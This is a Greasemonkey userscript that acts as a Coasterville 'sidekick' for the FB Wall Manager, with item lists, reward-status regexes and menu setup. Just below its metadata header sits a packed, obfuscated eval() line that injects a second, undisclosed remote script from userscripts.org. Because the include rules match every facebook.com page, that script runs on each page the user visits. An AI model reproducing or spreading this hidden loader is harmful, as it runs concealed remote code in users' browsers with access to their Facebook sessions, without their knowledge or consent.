// ==UserScript==
// @name           	Wall Manager Sidekick Plus (Coasterville)  + Last Update
// @description    	Assists Wall Manager with Coasterville posts
// @include        	http://*.facebook.com/coasterville/Reward.php?*
// @include        	http://www.facebook.com/pages/FB-Wall-Manager/*
// @include			http://client.themepark.zynga.com/flash.php?*notOnFlash*
// @include			http://client.themepark.zynga.com/Reward.php?*
// @include 	    http*://client.themepark.zynga.com/crew_apply_accept.php?*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include        	http://www.facebook.com/pages/FB-Wall-Manager/199384176806715
// @license        	http://creativecommons.org/licenses/by-nc-nd/3.0/us/
// @require        	http://userscripts.org/scripts/source/123889.user.js
// @updateURL		https://userscripts.org/scripts/source/157744.meta.js
// @downloadURL		https://userscripts.org/scripts/source/157744.user.js
// @grant			none
// @namespace		http://asknetguy.com/userscripts/wmscripts
// @version        	1.0.22.0
// @copyright      	AskNetGuy - Isa Sorensen
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



/* Notes******************************************************************
1.0.8.0 - Rewrote script
1.0.8.1 - minor edits
1.0.8.2 - added support for accepting hotel guests - enabled httpsTrouble flag
1.0.9.0 - added new items, moved a few things around
1.0.9.1 - code cleaning added items
1.0.10.0 - Added items
1.0.11.0 - added box of chocolates
1.0.12.0 - added Stage Monitors & accordions
1.0.13.0 - added Stirrups
1.0.14.0 - added Fair Food Coupons
1.0.15.0 - added Tour Maps
1.0.16.0 - added Meat Thermometers
1.0.17.0 - added Park Brochures
1.0.18.0 - added Archeologist Brushes and Tour Bus Relic Rewards
1.0.19.0 - added Gold Keys
1.0.20.0 - modified Tour Bus Relic Rewards to be more inclusive
1.0.20.1 - fixed typos
1.0.21.0 - added Deodorant Sticks
1.0.22.0 - added Sea Horses, Sea Shells, Row Boats, Sawdust Bags and sammiches.
*********************************************************************** */


(function() {

	//special events for window.top but not during docking
	//REVISED 2012.10.09
	if ((window.top==window.self) && !window.location.href.match( /(^http:\/\/www\.facebook\.com\/pages\/FB-Wall-Manager\/)/ )) {
		
		//This line causes the top window to listen for commands from WM's sidekick handler
		if (window.top==window.self) Sidekick.listen();
		//clean up the handler channel when page is unloaded
		window.addEventListener("onBeforeUnload", Sidekick.unlisten, false);	

		//prevent reading data from top page because it does not contain useful information and can trick the sidekick
		//remove this line if the top page is actually the page you need to read from
		//comment this line out if you:
		//	A) do not get your accept/fail messages from an iframe, or 
		//	B) the game ticker does not affect you or draw to your collection pages.
		return; 
	}

	//predefine some variables so we can just call them when needed instead of typing the same stuff over and over again
	var version = "1.0.20.1"; //use something like 1.2.3.4 where 1 is the version, 2 is the major revision, 3 is the minor revision, and 4 is a bug fix
	var appID="446806932006133"; //find your appID on facebook or use google
    var scriptID="157744"; //the id of your script on userscripts.org
    var appName="Coasterville"; //the text name of the app/game you are collecting for
	var appIcon="http://asknetguy.com/img/coasterville.gif"; 
	//option to report WM2 statuses to the address bar, allowing backward
	//support for WM2 when WM3 is released. This may cause errors in chrome.
	//ADDED 2012.10.09
	var supportWM2=true;

	//attempt to dock with the WM host script
	function dock(){
		
		var materials = [
								
			{name:"Energy", id:"frType=ask_for_energy", event:"rewards"},
			{name:"Coins", id:"frType=ask_for_coins", event:"rewards"},
			{name:"Thrills", id:"frType=ask_for_thrill", event:"rewards"},
			{name:"Goods", id:"frType=ask_for_goods", event:"rewards"},
			{name:"Front Gate Rename Rewards", id:"frType=frontgate_rename_reward", event:"Reward"},
			{name:"Saga Rewards", id:"frType=saga_quest_complete", event:"rewards"},
			{name:"Quest Rewards", id:"frType=quest_complete", event:"rewards"},
			{name:"Upgrade Rewards", id:"frType=upgrade_complete", event:"rewards"},
			{name:"Milestone Rewards", id:"frType=saga_milestone_complete", event:"rewards"},
			{name:"Discovery Rewards", id:"frType=build_complete", event:"rewards"},
			{name:"Progressive Quest", id:"frType=quest_complete_progressive", event:"rewards"},
			{name:"Build Up Rewards", id:"frType=buildup_complete", event:"rewards"},
			{name:"Fan Favorite Rewards", id:"frType=helped_neighbor", event:"rewards"},
			{name:"Level Up  Rewards", id:"frType=level_up", event:"rewards"},
			{name:"Hotel VIP Rewards", id:"frType=hotel_vip_checkin_share", event:"rewards"},
			{name:"Theme Unlock Rewards", id:"frType=theme_unlock", event:"rewards"},
			{name:"Completed Saga Rewards", id:"frType=saga_complete", event:"rewards"},
			{name:"Neighbor Help Rewards", id:"frType=helped_neighbor", event:"rewards"},
			{name:"Relic Rewards", id:"frType=tourbus_receive_brag_D31", event:"rewards"},
			{name:"Hotel VIP Permission", id:"crew_apply_accept"},
			{name:"Ice Cream", id:"frType=ask_for_Stuff_D010", event:"Supplies"},
			{name:"Stirrups", id:"frType=ask_for_parts_D076", event:"Supplies"},
			{name:"Work Gloves", id:"frType=ask_for_parts_D086", event:"Supplies"},
			{name:"Pickaxes", id:"frType=ask_for_parts_D096", event:"Supplies"},
			{name:"Fair Flag", id:"frType=ask_for_parts_D135", event:"Supplies"},
			{name:"First Aid Kits", id:"frType=ask_for_parts_D160", event:"Supplies"},
			{name:"Horseshoes", id:"frType=ask_for_parts_D167", event:"Supplies"},
			{name:"Lost Bins", id:"frType=ask_for_parts_D169", event:"Supplies"},
			{name:"Royal Crests", id:"frType=ask_for_parts_D176", event:"Supplies"},
			{name:"Soap Dispensers", id:"frType=ask_for_parts_D178", event:"Supplies"},
			{name:"Idols", id:"frType=ask_for_parts_D260", event:"Supplies"},
			{name:"Ride Operator Uniforms", id:"frType=ask_for_parts_D263", event:"Supplies"},
			{name:"Sales Uniforms", id:"frType=ask_for_parts_D264", event:"Supplies"},
			{name:"Princess Uniforms", id:"frType=ask_for_parts_D266", event:"Supplies"},
			{name:"Cherokee Uniforms", id:"frType=ask_for_parts_D268", event:"Supplies"},
			{name:"Huntress Uniforms", id:"frType=ask_for_parts_D270", event:"Supplies"},
			{name:"Fair Food Coupons", id:"frType=ask_for_parts_D305", event:"Supplies"},
			{name:"Meat Thermometers", id:"frType=ask_for_parts_D306", event:"Supplies"},
			{name:"Lock Picks", id:"frType=ask_for_parts_D309", event:"Supplies"},
			{name:"Park Brochures", id:"frType=ask_for_parts_D313", event:"Supplies"},
			{name:"Tour Maps", id:"frType=ask_for_parts_D315", event:"Supplies"},
			{name:"Gold Keys", id:"frType=ask_for_parts_D328", event:"Supplies"},
			{name:"Deodorant Sticks", id:"frType=ask_for_parts_D501", event:"Supplies"},
			{name:"Coaster Expansion", id:"frType=ask_for_parts_D997", event:"Supplies"},
			{name:"Gingerbread Man", id:"frType=ask_for_parts_DL002", event:"Supplies"},
			{name:"Ice Cubes", id:"frType=ask_for_parts_DL003", event:"Supplies"},
			{name:"Green Apples", id:"frType=ask_for_parts_DL005", event:"Supplies"},
			{name:"Balloon Swords", id:"frType=ask_for_parts_DL008", event:"Supplies"},
			{name:"Training Dummies", id:"frType=ask_for_parts_DL009", event:"Supplies"},
			{name:"Fantastic Rice", id:"frType=ask_for_parts_DL012", event:"Supplies"},
			{name:"Monster Pelts", id:"frType=ask_for_parts_DL019", event:"Supplies"},
			{name:"Sharp Fingernails", id:"frType=ask_for_parts_DL021", event:"Supplies"},
			{name:"Stage Monitors", id:"frType=ask_for_parts_DL023", event:"Supplies"},
			{name:"Accordion Cases", id:"frType=ask_for_parts_DL025", event:"Supplies"},
			{name:"Valentine Day Roses", id:"frType=ask_for_parts_DL030", event:"Supplies"},
			{name:"Box of Chocolates", id:"frType=ask_for_parts_DL032", event:"Supplies"},
			{name:"Charcoal", id:"frType=ask_for_parts_DL034", event:"Supplies"},
			{name:"Archeologist Brushes", id:"frType=ask_for_parts_DL036", event:"Supplies"},
			{name:"Fluorescent Tubes", id:"frType=ask_for_parts_DL042", event:"Supplies"},
			{name:"Sheet Music", id:"frType=ask_for_parts_DL045", event:"Supplies"},
			{name:"Sawdust Bags", id:"frType=ask_for_parts_DL053", event:"Supplies"},
			{name:"Sea Shells", id:"frType=ask_for_parts_DL060", event:"Supplies"},
			{name:"Sea Horses", id:"frType=ask_for_parts_DL058", event:"Supplies"},
			{name:"Row Boats", id:"frType=ask_for_parts_DL062", event:"Supplies"},
			{name:"Sammiches", id:"frType=ask_for_parts_D500", event:"Supplies"},
		];

//new items currently not working
		var newItems=[
			""
		];


		var sendWords = ["needs","send","looking for","get one too","get some too","approve","could sure use some","want to get","You'll get a","envíale","envoie-leur"];

		//manage accept texts here, which are true text names of your bonuses
		var accTextGet={}, accTextSend={};
		//by default, this sidekick will have text for both sent and collected items by name
		accTextGet = accTextFromData(materials); //omit this line if you will only be sending stuff
		accTextSend = accTextFromData(materials,"send"); //omit this line if you will only be getting stuff
		
		
		//enter below anything you want special, something changed, or to correct text messed up by the game creators
		var accTextCustoms = {
			doUnknown:"Unknown", //needed if your script contains the menu item "doUnknown" (which is added by default now by WM host)
			send:"Unknown", //needed if your script returns just "send" without a material name and "sendall" is used in the menu

			
		};
		
		//get a list of search terms from the materials object. These terms are built specifically for text searches
		//there is no need to worry about case because the searchable portion and the search terms are all converted to lower case in the WM host
		var searchList = searchFromData(materials); //pulls the id||name field from the materials object above to use as a search term
		//var searchListNoSpaces = searchList.noSpaces(); //this version contains no spaces in each element

		
		//See wiki for more options
		var tests=[
			//catch stuff that will be missed by material name searches here
			//{search:["url"], find:["VRL_ASK_ENERGY"], ret:"sendenergy"}, //this searches in the url of a bonus link to find some special code
			//{search:["url"], find:["VRL_HIGH_SCORE"], ret:"energy"},

			//if send words are found, but material does not exist in the list, returns just "send" so sendall picks it up
			//note that this is a nested test where subtests take presidence over return values given by the parent test
			//what that means is that if the inner tests fail, the outer test still returns "send" because something in sendWords[] was found
			{search:["link","body"], find:sendWords, ret:"send", kids:[
				//otherwise return the actual material name prefixed with "send". Example: "sendnailgun"
				{search:["url"], find:"{%1}", ret:"send{%1}", subTests:searchList}, //search first in the url
				{search:["link","body"], find:"{%1}", ret:"send{%1}", subTests:searchList}, //search second in the post link and body
			]},

			//check for getting of materials by id
			//this method is based on your above materials list
			{search:["url"], find:"{%1}",ret:"{%1}",subTests:searchList}, //search first in the url
			{search:["link","body"], find:"{%1}",ret:"{%1}",subTests:searchList}, //search second in the post link text and body text


			
		];
	
		
		//manage your menu here
		//this menu is attached to the options menu already available in the WM host
		//future versions of WM may attach your menu segment in another location		
		//As of WM3beta3 please be absolutely sure your list pairs have unique id's 
		//at every branch, even if that means adding some arbitrary prefix
		//if you do use an arbitrary prefix, do not use functions like unique()
		//to randomly generate them, as they will not have the same id
		//when the user refreshes, and section open/close saving will fail
		menu={
			//this is the section housing for your sidekick which displays its name and current version
			section_main:{type:"section",label:appName+" ("+version+")",kids:{
			
				//this links directly to your sidekick installer on userscripts.org
				updateSidekick:{type:'link',label:'Update Sidekick',href:'http://userscripts.org/scripts/source/'+scriptID+'.user.js'},
				
				//this is a hypothetical rendering of items you could get from a friend via bonus links
				sep_GET:{type:'separator',label:'Get Items',kids:{
				/*	coins:{type:"checkbox",label:"Coins"},
					xp:{type:"checkbox",label:"XP"},
					energy:{type:"checkbox",label:"Energy"},
					clue:{type:"checkbox",label:"Clues"},*/
					doUnknown:{type:"checkbox",label:"Process Unknown Links"},
				}},
				
				//this is a hypothetical rendering of items you might send a friend via bonus links
				sep_SEND:{type:"separator",label:"Send Items",kids:{
 					sendall:{type:'checkbox',label:'Send All (or select from options below)'},
					send:{type:'checkbox',label:'Send Unrecognized Items'},
				}},
			}},
		};

		//attach material lists to the menu
		//here we grab all the data out of the materials object (far) above and create a simple menu structure from it
		//automatic menu structure is in the form of GET/SEND > EVENT > NAME
		
		//use this if all your tests get something from a friend
		menuFromData(materials,menu["section_main"]["kids"]["sep_GET"]["kids"],newItems,""); //attach a list of materials to the GET block
		//use this if all your tests send something to a friend and that is how you identify them
		menuFromData(materials,menu["section_main"]["kids"]["sep_SEND"]["kids"],newItems,"send"); //attach a list of materials to the SEND block
		//OR use both of the above if you have tests that determine the difference between post types
		
		//send all this information in to the WM script
		//this sidekick function relays all the information you provided here to the host script when 
		//this sidekick activates on the same page as the host
		//for details on specific parts, please see the wiki
		Sidekick.dock({
			appID:appID,
			name:appName, 
			version:version,
			thumbsSource:null,
			flags:{httpsTrouble:true},
			//As of beta 6, if your sidekick works in chrome without being postMessageCompatible, pass the 
			//flag worksInChrome:true
			alterLink:{}, //<-- see wiki for details on this one
			icon:appIcon,
			desc:null,
			accText:mergeJSON(accTextGet,accTextSend,accTextCustoms), //joins automatically generated texts with your custom texts
			tests:tests,
			menu:menu,
			
			//As of WM3 beta 6:
			//if you need to support multiple apps with one sidekick
			//this block will add a separate sidekick entry, however
			//its tests will be pulled from the parent sidekick, as
			//will most other data
			/*addFilters:[
				{
					appID:'<alternate appID>',
					name:'<alternate name>',
					icon:'<alternate icon>',
					menu:'<alternate menu tree>', //new in beta6
				}, //...add more if needed
			],*/
			//additionally the synAppID entry or array is no longer used
			//wm3 instead pulls data directly from the addFilters array
			
			//As of WM3 beta 7:
			//if you want to provide assistance to an existing sidekick
			//you can create a sidekick sidekick, or henchman script
			//If skType is omitted, skType is assumed 0, meaning
			//this sidekick will fight other sidekicks for dominance.
			//Supply a 1 here if you want this sidekick to simply add
			//menu branches, tests and accept texts.
			//Additional options are certain to appear in the future.
			skType:0,
		});
	};

	
	function read(){
		try{
			var statusCode=0, text=document.documentElement.textContent;
		} catch(e){window.setTimeout(read,1000);return;} 

		//already claimed
		if (text.match(/((Y|y)ou('ve)? already (responded|claimed))/)) statusCode=-6; 
 
		//over-limits
		else if (text.match(/(cannot have anymore|reached the collection limit|maximum energy has been awarded)/)) statusCode=-3; 
 		
		//Hotel limits
		else if (text.match(/(is already full| your inventory limit|is already a VIP (G|g)uest)/)) statusCode=-3; 
 				
		//all-outs
		else if (text.match(/(all the (.*) (have|has) been claimed|no longer available)/)) statusCode=-2; 

		//generic fails
		else if (text.match(/(can't claim this reward)/))statusCode=-1;

		//expired fail
		else if (text.match(/(this reward has expired)/))statusCode=-11;

		//server errors
		else if (text.match(/(does not appear to be valid)/)) statusCode=-5;
		else if (text=="") statusCode=-5;

		//accepts
		else if (text.match(/(Gift Claimed Successfully|You just got|now a VIP (G|g)uest|You just)/)) statusCode=1;

		//here we actually pass back the status code
		//REVISED 2012.10.09
		if (statusCode!=0) {
			Sidekick.sendStatus(statusCode);
			if (supportWM2) sendMessage("status="+statusCode); //may cause cross-domain errors in chrome
		} else window.setTimeout(read,1000); //restart if nothing was found of value
		
		
	};

	
	
	
	//start the script either as a docking sidekick, or as a reward reading sidekick
	if (window.location.href.startsWith('http://www.facebook.com/')) {
		dock(); //runs the dock function above to connect to the host
		Sidekick.openChannel(); //new WM 3 methods for communication to host
	} else read(); //runs the sidekick functions to determine post process accept/fail status

})(); // anonymous function wrapper end
